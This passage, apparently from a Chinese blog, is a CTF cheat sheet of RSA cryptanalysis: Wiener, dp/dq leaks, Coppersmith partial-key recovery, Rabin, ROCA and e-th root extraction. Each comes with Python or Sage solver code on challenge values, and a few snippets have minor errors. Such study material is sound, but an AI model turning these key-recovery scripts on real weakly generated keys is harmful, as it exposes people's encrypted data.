class="number">77310199867448677782081572109343472783781135641712597643597122591443011229091533516758925238949755491395489408922437493670252550920826641442189683907973926843505436730014899918587477913032286153545247063493885982941194996251799882984145155733050069564485120660716110828110738784644223519725613280140006783618393995138076030616463398284819550627612102010214315235269945251741407899692274978642663650687157736417831290404871181902463904311095448368498432147292938825418930527188720696497596867575843476810225152659244529481480993843168383016583068747733118703000287423374094051895724494193455175131120243097065270804457787026492578916584536863548445813916819417857064037664101684455000184987531252344582899589746272173970083733130106407810619258077266603898529285634495710846838011858287024329514491058790557305041389614650730267774482954666726949886313386881066593946789460028399523245777171320319444673551268379126203862576627540177888290265714418064334752499940587750374552330008143708562065940245637685833371348603338834447212248648869514585047871442060412622164276894766238383894693759347590977926306581080390685360615407766600573527565016914830132066428454738135380178959590692145577418811677639050929791996313180297924833690095</span></span><br><span class="line">c = <span class="number">165251729917394529793163344300848992394021337429474789711805041655116845722480301677817165053253655027459227404782607373107477419083333844871948673626672704233977397989843349633720167495862807995411682262559392496273163155214888276398332204954185252030616473235814999366132031184631541209554169938146205402400412307638567132128690379079483633171535375278689326189057930259534983374296873110199636558962144635514392282351103900375366360933088605794654279480277782805401749872568584335215630740265944133347038070337891035560658434763924576508969938866566235926587685108811154229747423410476421860059769485356567301897413767088823807510568561254627099309752215808220067495561412081320541540679503218232020279947159175547517811501280846596226165148013762293861131544331444165070186672186027410082671602892508739473724143698396105392623164025712124329254933353509384748403154342322725203183050328143736631333990445537119855865348221215277608372952942702104088940952142851523651639574409075484106857403651453121036577767672430612728022444370874223001778580387635197325043524719396707713385963432915855227152371800527536048555551237729690663544828830627192867570345853910196397851763591543484023134551876591248557980182981967782409054277224</span></span><br><span class="line">d = wienerAttack(e, n)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>也可以使用 https://github.com/pablocelayes/rsa-wiener-attack
的脚本</p>
</blockquote>
<h2 id="dp-dq-泄露">dp &amp; dq 泄露</h2>
<h3 id="特征-6">特征</h3>
<p>题目仅给出<span class="math inline">\(p,q,dp,dq,c\)</span>，不给公钥<span class="math inline">\(e\)</span></p>
<h3 id="原理-6">原理</h3>
<p>已知 <span class="math inline">\(dp=inverse(e,p-1)\)</span>，<span class="math inline">\(dq=inverse(e,q-1)\)</span>，使用 CRT 可得 <span class="math inline">\(d=inverse(e,(p-1)(q-1))\)</span></p>
<p>对 <span class="math inline">\(m\)</span> 也是同理</p>
<h3 id="实现-6">实现</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dec</span>(<span class="params">dp, dq, p, q, c</span>):</span><br><span class="line">    InvQ = gmpy2.invert(q,p)</span><br><span class="line">    mp = <span class="built_in">pow</span>(c,dp,p)</span><br><span class="line">    mq = <span class="built_in">pow</span>(c,dq,q)</span><br><span class="line">    m = (((mp - mq) * InvQ) % p) * q + mq</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line">p=<span class="number">0xf85d730bbf09033a75379e58a8465f8048b8516f8105ce2879ce774241305b6eb4ea506b61eb7e376d4fcd425c76e80cb748ebfaf3a852b5cf3119f028cc5971</span></span><br><span class="line">q=<span class="number">0xc1f34b4f826f91c5d68c5751c9af830bc770467a68699991be6e847c29c13170110ccd5e855710950abab2694b6ac730141152758acbeca0c5a51889cbe84d57</span></span><br><span class="line">dp=<span class="number">0xf7b885a246a59fa1b3fe88a2971cb1ee8b19c4a7f9c1a791b9845471320220803854a967a1a03820e297c0fc1aabc2e1c40228d50228766ebebc93c97577f511</span></span><br><span class="line">dq=<span class="number">0x865fe807b8595067ff93d053cc269be6a75134a34e800b741cba39744501a31cffd31cdea6078267a0bd652aeaa39a49c73d9121fafdfa7e1131a764a12fdb95</span></span><br><span class="line">c=<span class="number">0xae05e0c34e2ba4ca3536987cc2cfc3f1f7f53190164d0ac50b44832f0e7224c6fdeebd2c91e3991e7d179c26b1b997295dc9724925ba431f527fba212703a0d14a34ce133661ae0b6001ee326303d6ccdc27dbd94e0987fae25a84f197c1535bdac9094bfb3846b7ca696b2e5082bea7bff804da275772ca05dd51b185a4fc30</span></span><br><span class="line"></span><br><span class="line">m = dec(dp,dq,p,q,c)</span><br></pre></td></tr></table></figure>
<h2 id="dp-泄露">dp 泄露</h2>
<h3 id="实现-7">实现</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113</span></span><br><span class="line">dp = <span class="number">905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</span></span><br><span class="line">c = <span class="number">140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> (dp * e - <span class="number">1</span>) % i == <span class="number">0</span> <span class="keyword">and</span> n % (((dp * e - <span class="number">1</span>) // i) + <span class="number">1</span>) == <span class="number">0</span>:</span><br><span class="line">        p = ((dp * e - <span class="number">1</span>) // i) + <span class="number">1</span></span><br><span class="line">        q = n // (((dp * e - <span class="number">1</span>) // i) + <span class="number">1</span>)</span><br><span class="line">        phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">        d = gmpy2.invert(e, phi)</span><br><span class="line">        m = <span class="built_in">int</span>(<span class="built_in">pow</span>(c, d, n))</span><br></pre></td></tr></table></figure>
<h2 id="已知-p-高位">已知 <span class="math inline">\(p\)</span>
高位</h2>
<h3 id="原理-7">原理</h3>
<p>已知 <span class="math inline">\(p\)</span> 的一半高位时，可以使用
Coppersmith 方法分解 <span class="math inline">\(N\)</span>。</p>
<p>其中在 Coppersmith 方法里，<span class="math inline">\(X\)</span> 为
<span class="math inline">\(p\)</span> 未知的位数范围，<span class="math inline">\(p&gt;N^\beta\)</span>。</p>
<blockquote>
<p>1024 位需要知道 570 位</p>
<p>512 位需要知道 300 位</p>
</blockquote>
<h3 id="实例">实例</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p3 = getPrime(<span class="number">512</span>)</span><br><span class="line">q3 = getPrime(<span class="number">512</span>)</span><br><span class="line">N3 = p3*q3</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">pow</span>(msg3,e3,N3)</span><br><span class="line"><span class="built_in">print</span> (e3,N3)</span><br><span class="line"><span class="built_in">print</span> p3&gt;&gt;<span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># phigh = 7117286695925472918001071846973900342640107770214858928188419765628151478620236042882657992902</span></span><br><span class="line"><span class="comment"># N = 113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147</span></span><br></pre></td></tr></table></figure>
<p>利用 Sagemath 中 <code>small_roots</code> 的参数，变成 Coppersmith
方法求解低位值。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">phigh = <span class="number">7117286695925472918001071846973900342640107770214858928188419765628151478620236042882657992902</span></span><br><span class="line">N = <span class="number">113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147</span></span><br><span class="line"><span class="comment"># 未知的位数</span></span><br><span class="line">kbits = <span class="number">200</span></span><br><span class="line"><span class="comment"># beta值按需修改</span></span><br><span class="line">beta = <span class="number">0.5</span></span><br><span class="line"></span><br><span class="line">P.&lt;x&gt; = Zmod(N)[]</span><br><span class="line">f = x + (phigh &lt;&lt; kbits)</span><br><span class="line">p0 = f.small_roots(X=<span class="number">2</span>**kbits, beta=beta)</span><br><span class="line"><span class="keyword">assert</span>(p0)</span><br><span class="line">p0 = p0[<span class="number">0</span>]</span><br><span class="line">p = Integer(f(p0))</span><br><span class="line"><span class="built_in">print</span>(p)</span><br></pre></td></tr></table></figure>
<h2 id="已知-p-低位">已知 <span class="math inline">\(p\)</span>
低位</h2>
<h3 id="原理-8">原理</h3>
<p>假设已知 <span class="math inline">\(p\)</span> 的 <span class="math inline">\(k\)</span> 个低位，那么有： <span class="math display">\[
p \pmod{2^k}=p_0
\]</span> 即 <span class="math display">\[
p=p_0+\alpha\cdot2^k
\]</span> 两边同乘，得到 <span class="math display">\[
n=p_0q+\alpha q\cdot2^k
\]</span> 有 <span class="math display">\[
np_0^{-1}=q+\alpha qp_0^{-1}\cdot2^k
\]</span> 两边同余，得到： <span class="math display">\[
q\pmod{2^k}=np_0^{-1}\pmod{2^k}
\]</span> 换句话说，知道 <span class="math inline">\(p\)</span>
低位，即可求 <span class="math inline">\(q\)</span> 低位。</p>
<h2 id="e与varphin-不互素"><span class="math inline">\(e\)</span>与<span class="math inline">\(\varphi(n)\)</span> 不互素</h2>
<h3 id="原理-9">原理</h3>
<p>已知<span class="math inline">\(c_1,c_2,p,q_1,q_2,n_1=pq_1,n_2=pq_2,e\)</span>，则有
<span class="math display">\[
k=\gcd(e,\varphi(n))\\
c_1=m^{k\frac{e_1}{k}}mod\ n_1\\
c_2=m^{k\frac{e_2}{k}}mod\ n_2\\
\]</span> 则 <span class="math display">\[
m^k=c_1^{d_1}mod\ n_1\\
m^k=c_2^{d_2}mod\ n_2
\]</span> 即 <span class="math display">\[
\begin{cases}
m^k=c_1^{d_1}mod\ p\\
m^k=c_2^{d_2}mod\ p\\
m^k=c_1^{d_1}mod\ q_1\\
m^k=c_2^{d_2}mod\ q_2
\end{cases}
\]</span> 合并后，利用中国剩余定理求特解： <span class="math display">\[
last=CRT((c_1^{d_1},c_2^{d_2}),(q_1,q_2))
\]</span> 其中假设<span class="math inline">\(k=ab,b与\varphi(q_1q_2)互素\)</span>，则有 <span class="math display">\[
d=invert(b,\varphi(q_1q_2))\\
m^{ab}=kq_1q_2+last
\]</span></p>
<h2 id="pq-高位相同"><span class="math inline">\(p,q\)</span>
高位相同</h2>
<h3 id="特征-7">特征</h3>
<p>已知 <span class="math inline">\(n\)</span>，其中 <span class="math inline">\(|p-q|\)</span> 较小，<span class="math inline">\(p,q\)</span> 数量位知道</p>
<h3 id="实例-1">实例</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">nbits = <span class="number">1024</span></span><br><span class="line">p = getPrime(nbits // <span class="number">2</span>)</span><br><span class="line">q = next_prime(p + (<span class="number">1</span> &lt;&lt; <span class="built_in">int</span>(nbits * beta)))</span><br><span class="line">n = p * q</span><br></pre></td></tr></table></figure>
<p>其中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">n = 122774778628333786198247673730199699244621671207929503475974934116435291656353398717362903500544713183492877018211738292001516168567879903073296829793548881467270228989482723510323780292947403861546283099122868428902480999485625751961457245487615479377459707992802193391975415447673215862245349068018710525679</span><br><span class="line">beta = 0.44</span><br></pre></td></tr></table></figure>
<p>不妨看作 <span class="math inline">\(n=p\cdot(p+(1 &lt;&lt;
int(nbits*beta)))\)</span>，则可以将 <span class="math inline">\(p\)</span> 的近似值求出来。</p>
<p>这时再进行小范围的爆破即可。（这里需要注意到，近似值与真实值相比是要偏大的，需要使用
<code>previous_prime</code> 函数）</p>
<p>sagemath 脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">delta = (<span class="number">1</span> &lt;&lt; <span class="built_in">int</span>(nbits * beta))</span><br><span class="line">R = RealField(<span class="number">1000</span>)</span><br><span class="line">p = polygen(R)</span><br><span class="line">f = p * (p + delta) - n</span><br><span class="line">p = <span class="built_in">int</span>(f.roots()[<span class="number">1</span>][<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> n % p != <span class="number">0</span>:</span><br><span class="line">    p = previous_prime(p)</span><br></pre></td></tr></table></figure>
<p>这样就将 <span class="math inline">\(p\)</span> 爆破出来了。</p>
<h2 id="简单填充攻击">简单填充攻击</h2>
<h3 id="题目描述">题目描述</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x + <span class="string">b&quot;\x00&quot;</span> * (<span class="number">128</span> - <span class="built_in">len</span>(x))</span><br><span class="line"></span><br><span class="line">flag = flag[<span class="number">7</span>:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">16</span></span><br><span class="line"></span><br><span class="line">flag = pad(flag)</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>, file=f)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>, file=f)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>, file=f)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>n =
20143874513891625472763023083725333814544365923300648765753585512236262936134576226420495156390118451084859695988018681103828733472481714477702312584392200607513775527941225389450524064860609500522646820403150136601325693755011504371254765148925814568051337093873243247759130508598378247848927825303243080348476280520682747234144016534355268883431
e = 65537 c =
9099248209700870107517981697995437593126643973286742880366239649474438147247165218637687381898125380392681666447352387825995403531162271411514111581358141144178855022212666392579294107956774766000410956462804204065293225382573948622209661112442721208408763210528401826636309622296148093801229149917160087959002855064445785159864465696643561701308</p>
</blockquote>
<h3 id="实现-8">实现</h3>
<p>当实际明文<span class="math inline">\(m&lt;p\)</span>时可以恢复</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcd, invert</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, long_to_bytes, bytes_to_long</span><br><span class="line"></span><br><span class="line"><span class="comment"># 仅在p域下</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dec</span>(<span class="params">n, e, phi, c</span>):</span><br><span class="line">    d = invert(e, phi)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    p = <span class="number">297342668339361548416629796745639177971</span></span><br><span class="line">    q = <span class="number">67746329937757624632404631102047546126139910162127525807142364896504844830533422758326696949629668349819199912570222748973935637740283799230746144014458722401719184655996325043824137789180083286215748548298177270209171461643103260188864468982281090005047122016817287399362453731379535534001682626445843123261</span></span><br><span class="line"></span><br><span class="line">    n = p * q</span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    e = <span class="number">0x10001</span></span><br><span class="line">    c = <span class="number">9099248209700870107517981697995437593126643973286742880366239649474438147247165218637687381898125380392681666447352387825995403531162271411514111581358141144178855022212666392579294107956774766000410956462804204065293225382573948622209661112442721208408763210528401826636309622296148093801229149917160087959002855064445785159864465696643561701308</span></span><br><span class="line"></span><br><span class="line">    m = dec(n, e, p-<span class="number">1</span>, c)</span><br><span class="line">    t = <span class="number">256</span>**<span class="number">112</span></span><br><span class="line">    t = invert(t, p)</span><br><span class="line">    m = m*t % p</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)).decode())</span><br></pre></td></tr></table></figure>
<h3 id="实现-9">实现</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CRT</span>(<span class="params">r,d</span>):</span><br><span class="line">    M = <span class="number">1</span></span><br><span class="line">    l = <span class="built_in">len</span>(r)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,l):</span><br><span class="line">        M = d[i] * M</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,l):</span><br><span class="line">        md = M//d[i]</span><br><span class="line">        x = (x + gmpy2.invert(md, d[i])  * md *r[i] )%M</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(M+x% M)%M</span><br><span class="line"></span><br><span class="line">p = <span class="number">109935857933867829728985398563235455481120300859311421762540858762721955038310117609456763338082237907005937380873151279351831600225270995344096532750271070807051984097524900957809427861441436796934012393707770012556604479065826879107677002380580866325868240270494148512743861326447181476633546419262340100453</span></span><br><span class="line"></span><br><span class="line">e1 = <span class="number">15218928658178</span></span><br><span class="line">q1=<span class="number">127587319253436643569312142058559706815497211661083866592534217079310497260365307426095661281103710042392775453866174657404985539066741684196020137840472950102380232067786400322600902938984916355631714439668326671310160916766472897536055371474076089779472372913037040153356437528808922911484049460342088834871</span></span><br><span class="line">c1 =  <span class="number">262739975753930281690942784321252339035906196846340713237510382364557685379543498765074448825799342194332681181129770046075018122033421983227887719610112028230603166527303021036386350781414447347150383783816869784006598225583375458609586450854602862569022571672049158809874763812834044257419199631217527367046624888837755311215081173386523806086783266198390289097231168172692326653657393522561741947951887577156666663584249108899327053951891486355179939770150550995812478327735917006194574412518819299303783243886962455399783601229227718787081785391010424030509937403600351414176138124705168002288620664809270046124</span></span><br><span class="line">n1 = p*q1</span><br><span class="line"></span><br><span class="line">e2 = <span class="number">381791429275130</span></span><br><span class="line">q2 =  <span class="number">114401188227479584680884046151299704656920536168767132916589182357583461053336386996123783294932566567773695426689447410311969456458574731187512974868297092638677515283584994416382872450167046416573472658841627690987228528798356894803559278308702635288537653192098514966089168123710854679638671424978221959513</span></span><br><span class="line">c2 =  <span class="number">7395591129228876649030819616685821899204832684995757724924450812977470787822266387122334722132760470911599176362617225218345404468270014548817267727669872896838106451520392806497466576907063295603746660003188440170919490157250829308173310715318925771643105064882620746171266499859049038016902162599261409050907140823352990750298239508355767238575709803167676810456559665476121149766947851911064706646506705397091626648713684511780456955453552020460909638016134124590438425738826828694773960514221910109473941451471431637903182205738738109429736425025621308300895473186381826756650667842656050416299166317372707709596</span></span><br><span class="line">n2 = p*q2</span><br><span class="line"></span><br><span class="line">phi1=(p-<span class="number">1</span>)*(q1-<span class="number">1</span>)</span><br><span class="line">phi2=(p-<span class="number">1</span>)*(q2-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">xx1=gmpy2.gcd(e1,phi1) <span class="comment"># xx1=14</span></span><br><span class="line">xx2=gmpy2.gcd(e2,phi2) <span class="comment"># xx2=14</span></span><br><span class="line"></span><br><span class="line">d1=gmpy2.invert(e1//xx1,phi1)</span><br><span class="line">d2=gmpy2.invert(e2//xx2,phi2)</span><br><span class="line"></span><br><span class="line">nn=[]</span><br><span class="line">aa=[]</span><br><span class="line"></span><br><span class="line">nn.append(q1)</span><br><span class="line">nn.append(q2)</span><br><span class="line">a1=gmpy2.powmod(c1,d1,p*q1)%q1</span><br><span class="line">a2=gmpy2.powmod(c2,d2,p*q2)%q2</span><br><span class="line">aa.append(a1)</span><br><span class="line">aa.append(a2)</span><br><span class="line"></span><br><span class="line">last = CRT(aa,nn)</span><br><span class="line">new_e=<span class="number">7</span></span><br><span class="line">new_phi=(q1-<span class="number">1</span>)*(q2-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">new_d=gmpy2.invert(new_e,new_phi)</span><br><span class="line">m_2=gmpy2.powmod(last,new_d,q1*q2)</span><br><span class="line">m=gmpy2.iroot(m_2,<span class="number">2</span>)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>
<h2 id="rabin-攻击">Rabin 攻击</h2>
<h3 id="特征-8">特征</h3>
<p><span class="math inline">\(e=2\)</span></p>
<h3 id="原理-10">原理</h3>
<ul>
<li><p>计算出 <span class="math inline">\(m_p\)</span> 和<span class="math inline">\(m_q\)</span>： <span class="math display">\[
m_p=\sqrt{c}\mod{p}\\
m_q=\sqrt{c}\mod{q}
\]</span></p></li>
<li><p>利用扩展欧几里得算法计算出 <span class="math inline">\(y_p\)</span> 和 <span class="math inline">\(y_q\)</span> <span class="math display">\[
y_p·p+y_q·q=1
\]</span></p></li>
<li><p>然后解得四个明文： <span class="math display">\[
a=(y_p·p·m_q+y_q·q·m_p)\pmod{n}\\
b=n-a\\
c=(y_p·p·m_q-y_q·q·m_p)\pmod{n}\\
d=n-c
\]</span></p></li>
<li><p>其中，如果<span class="math inline">\(p,q\)</span>是形为<span class="math inline">\(4k+3\)</span>的不同素数，即<span class="math inline">\(p\equiv q\equiv 3\pmod{4}\)</span>，则 <span class="math display">\[
m_p=c^{\frac{1}{4}(p+1)}\pmod{p}\\
m_q=c^{\frac{1}{4}(q+1)}\pmod{q}
\]</span></p></li>
</ul>
<h3 id="实现-10">实现</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n=<span class="number">523798549</span></span><br><span class="line">p=<span class="number">10663</span></span><br><span class="line">q=<span class="number">49123</span></span><br><span class="line">e=<span class="number">2</span></span><br><span class="line">c=<span class="number">162853095</span></span><br><span class="line">a,inv_q ,inv_p= gmpy2.gcdext(q,p)</span><br><span class="line">mp = <span class="built_in">pow</span>(c, (p + <span class="number">1</span>) // <span class="number">4</span>, p)</span><br><span class="line">mq = <span class="built_in">pow</span>(c, (q + <span class="number">1</span>) // <span class="number">4</span>, q)</span><br><span class="line">a = (inv_p * p * mq + inv_q * q * mp) % n</span><br><span class="line">b = n - <span class="built_in">int</span>(a)</span><br><span class="line">c = (inv_p * p * mq - inv_q * q * mp) % n</span><br><span class="line">d = n - <span class="built_in">int</span>(c)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span>(a, b, c, d):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure>
<h2 id="coppersmith-定理攻击">Coppersmith 定理攻击</h2>
<h3 id="原理-11">原理</h3>
<p>Coppersmith 定理指出在一个 <span class="math inline">\(e\)</span>
阶的 <span class="math inline">\(mod\ n\)</span> 多项式 <span class="math inline">\(f(x)\)</span> 中，如果有一个根小于 <span class="math inline">\(n^\frac{1}{e}\)</span> ，就可以运用一个 O(log n)
的算法求出这些根。</p>
<p>这个定理可以应用于 RSA 算法。如果 <span class="math inline">\(e =
3\)</span>
并且在明文当中只有三分之二的比特是已知的，这种算法可以求出明文中所有的比特。</p>
<h2 id="pq-存在相同-module-攻击"><span class="math inline">\(p,q\)</span> 存在相同 module 攻击</h2>
<h3 id="特征-9">特征</h3>
<p><span class="math inline">\(p,q\)</span> 的生成需要借助某共同的
module <span class="math inline">\(M\)</span> 进行生成</p>
<h3 id="代码">代码</h3>
<p>直接使用他人的脚本，roca 攻击：<a href="https://github.com/jvdsn/crypto-attacks/blob/c26872bdac2e2d95c5be00e6e593c891c849f446/attacks/factorization/roca.py">https://github.com/jvdsn/crypto-attacks/blob/c26872bdac2e2d95c5be00e6e593c891c849f446/attacks/factorization/roca.py</a></p>
<p>论文《The Return of Coppersmith’s Attack: Practical Factorization of
Widely Used RSA Moduli》指出该攻击方式中 <span class="math inline">\(m,t\)</span> 的选择依据为 <span class="math inline">\(N\)</span> 的位数。</p>
<table>
<thead>
<tr class="header">
<th>nbits</th>
<th><span class="math inline">\(m\)</span></th>
<th><span class="math inline">\(t\)</span></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>512</td>
<td>5</td>
<td>6</td>
</tr>
<tr class="even">
<td>1024</td>
<td>4</td>
<td>5</td>
</tr>
<tr class="odd">
<td>2048</td>
<td>6</td>
<td>7</td>
</tr>
<tr class="even">
<td>3072</td>
<td>25</td>
<td>26</td>
</tr>
<tr class="odd">
<td>4096</td>
<td>7</td>
<td>8</td>
</tr>
</tbody>
</table>
<h2 id="有限域开根">有限域开根</h2>
<h3 id="特征-10">特征</h3>
<p><span class="math inline">\(e\)</span> 较小。</p>
<p>或者 <span class="math inline">\(\gcd(e,
\varphi(p))\neq1\)</span>，即 <span class="math inline">\(e\)</span> 与
<span class="math inline">\(\varphi(p)\)</span> 不互素的情况。</p>
<h3 id="原理-12">原理</h3>
<p><span class="math inline">\(e\)</span>
较小时，有限域开方速度较快。</p>
<p>同时运用到了高次剩余的定理：</p>
<p>对于同余式 <span class="math inline">\(X^n\equiv
d\pmod{p}\)</span></p>
<p>当 <span class="math inline">\(n|p-1\)</span> 时，满足 <span class="math display">\[
d^{\frac{p-1}{n}}\equiv 1\pmod{p}
\]</span> 才有解，此时解数为 <span class="math inline">\(n\)</span>；</p>
<p>当 <span class="math inline">\(n\)</span> 无法整除 <span class="math inline">\(p-1\)</span>，满足 <span class="math display">\[
d^{\frac{p-1}{k}}\equiv 1\pmod{p}
\]</span> 其中 <span class="math inline">\(k=\gcd(n,p-1)\)</span>，此时解数为 <span class="math inline">\(k\)</span>。</p>
<p>而我们需要求解的便是 <span class="math inline">\(m^e\equiv
c\pmod{n}\)</span></p>
<p>我们可以在 <span class="math inline">\(p,q\)</span>
域中分别开方得到同余式组（加快求解速度） <span class="math display">\[
\begin{cases}
m_1=\sqrt[e]{c}\pmod{p}\\
m_2=\sqrt[e]{c}\pmod{q}
\end{cases}
\]</span> 然后利用 CRT 得到 <span class="math display">\[
\begin{cases}
m_1=\sqrt[e]{c}\pmod{p}\\
m_2=\sqrt[e]{c}\pmod{q}\\
m=\sqrt[e]{c}\pmod{n}
\end{cases}
\]</span> 但因为有多解，所以需要进行验证。</p>
<h3 id="代码-1">代码</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params">p, q, e, c</span>):</span><br><span class="line">    P.&lt;x&gt;=Zmod(p)[]</span><br><span class="line">    f=x^e-c</span><br><span class="line">    mps=f.roots(multiplicities=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    P.&lt;x&gt;=Zmod(p)[]</span><br><span class="line">    g=x^e-c</span><br><span class="line">    mqs=g.roots(multiplicities=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    ms = []</span><br><span class="line">	<span class="keyword">import</span> itertools</span><br><span class="line">    <span class="keyword">for</span> mp, mq <span class="keyword">in</span> itertools.product(mps, mqs):</span><br><span class="line">        m = mp.crt(mq)</span><br><span class="line">        ms.append(m)</span><br><span class="line">    <span class="keyword">return</span> ms</span><br><span class="line"></span><br><span class="line">ms = solve(p, q, e, c)</span><br><span class="line"><span class="built_in">print</span>(ms)</span><br></pre></td></tr></table></figure>
<p>也可以尝试使用 Sagemath 自带的 <code>nth_root()</code> 函数。</p>
<p>线程加速 <code>check</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">something</span>):</span><br><span class="line">    <span class="keyword">if</span> long_to_bytes(<span class="built_in">int</span>(something)).startswith(<span class="string">b&#x27;NCTF&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(something)))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CRT_threading</span>(<span class="params">mps, mqs, p, q</span>):</span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    <span class="keyword">for</span> mp, mq <span class="keyword">in</span> itertools.product(mps, mqs):</span><br><span class="line">        m = CRT([mp, mq], [p, q])</span><br><span class="line">        <span class="keyword">if</span> check(m):</span><br><span class="line">            <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br><span class="line">            flag = <span class="keyword">not</span> flag</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] Done.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">thread_number = <span class="number">32</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(thread_number):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] Thread %d starting...&#x27;</span> % i)</span><br><span class="line">    thi = threading.Thread(target=CRT_threading, args=(mps, mqs[i*(<span class="built_in">len</span>(mqs) // thread_number):(i+<span class="number">1</span>)*(<span class="built_in">len</span>(mqs) // thread_number)], p, q), 